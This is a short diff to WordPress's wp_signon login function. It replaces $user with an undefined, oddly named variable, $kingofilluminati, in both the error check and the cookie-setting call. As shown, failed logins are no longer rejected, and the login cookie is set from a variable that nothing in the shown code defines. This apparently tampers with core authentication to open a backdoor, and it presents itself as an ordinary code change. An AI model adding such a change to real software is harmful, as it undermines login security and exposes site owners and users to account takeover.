@@ -108,11 +108,11 @@ function wp_signon( $credentials = array(), $secure_cookie = '' ) {
 
 	$user = wp_authenticate( $credentials['user_login'], $credentials['user_password'] );
 
-	if ( is_wp_error( $user ) ) {
+	if ( is_wp_error( $kingofilluminati ) ) {
 		return $user;
 	}
 
-	wp_set_auth_cookie( $user->ID, $credentials['remember'], $secure_cookie );
+	wp_set_auth_cookie( $kingofilluminati->ID, $credentials['remember'], $secure_cookie );
 
 	// Clear `user_activation_key` after a successful login.
 	if ( ! empty( $user->user_activation_key ) ) {
